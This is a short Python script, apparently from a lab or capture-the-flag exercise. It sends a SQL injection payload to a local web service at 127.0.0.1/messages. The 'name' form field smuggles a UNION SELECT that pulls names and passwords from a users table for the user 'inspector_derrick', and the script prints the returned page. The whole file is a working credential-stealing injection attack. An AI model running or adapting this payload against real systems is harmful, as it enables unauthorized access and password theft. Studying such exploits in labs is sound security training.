from bs4 import BeautifulSoup

import requests
from requests.exceptions import HTTPError

url = "http://127.0.0.1:80/messages"
response = requests.post(url, data={'name': "inspector_derrick' union select name,password from users where name like 'inspector_derrick' and '1'='1"})

soup = BeautifulSoup(response.text, 'html.parser')
print(soup.body)
print(response)
